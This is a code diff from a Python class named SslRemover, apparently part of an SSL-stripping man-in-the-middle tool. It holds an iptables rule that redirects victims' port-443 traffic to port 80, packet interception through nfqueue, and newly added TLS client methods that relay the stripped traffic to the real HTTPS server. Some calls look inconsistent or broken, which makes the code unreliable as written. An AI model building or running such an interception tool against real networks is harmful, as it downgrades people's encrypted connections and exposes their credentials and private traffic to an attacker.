@@ -24,18 +24,28 @@ class SslRemover():
         self.iprule2_remove = "iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80"
         self.thread        = threading.Thread(name="ssl-remover-{}".format(queue_num), target=self.queue.run)
         self.thread.setDaemon(True)
+        self.connected_tls = False
 
         self.queue.bind(queue_num, self.handle_packet)
 
-    def stripped_victim_automation(self):
-        #socket = TCP_client.tcplink(HTTP, <>, 80)
-        pass
+    # def stripped_victim_automation(self):
+    #     #socket = TCP_client.tcplink(HTTP, <>, 80)
+    #     pass
 
 
-    def tls_client_automation(self):
-        #greeting = TLSClientHello(ciphers=<int code of the cipher suite>)
-        connection = TLSClientAutomaton(dport=50000, client_hello=ch)
-        connection.run()
+    def start_tls_automaton(self, url):
+        self.connection = TLSClientAutomaton.tlsink(HTTP, server=url, dport=500)
+        #pkt = a.sr1(HTTP()/HTTPRequest(), session=TCPSession(app=True), timeout=2)
+        self.connected_tls = True
+
+    def close_tls_automaton(self):
+        self.connection.close_session()
+        self.connected_tls = False
+
+    def send_and_receive_https(self, pkt):
+        self.connection.send(pkt)
+        self.handle_packet(self.connection.recv())  
+    
 
     def handle_packet(self, packet_nfqueue):
         packet_scapy = IP(packet_nfqueue.get_payload())
